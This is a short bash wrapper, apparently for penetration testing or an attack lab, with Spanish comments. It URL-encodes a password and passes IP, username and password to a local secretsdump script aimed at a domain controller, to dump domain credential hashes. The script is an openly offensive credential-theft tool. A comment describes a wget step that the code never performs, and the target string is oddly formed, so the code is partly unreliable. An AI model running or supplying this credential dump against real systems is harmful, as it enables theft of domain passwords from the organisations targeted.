#!/bin/bash

ftp() {
    local input="$1"
    # Usamos sed para reemplazar @ con %40
    echo "$input" | sed 's/@/%40/g' #NO ESTOY SEGURO
}

IP=$1
USUARIO=$2
CONTRASE=$(ftp "$3")

# Ejecutamos wget y capturamos la salida en CHECK
#source /tmp/python/bin/activate && 
python3 ../secretsdump/py.py $IP/$USUARIO:$CONTRASE@dc.$IP #EL ULTIMO ES EL DC.

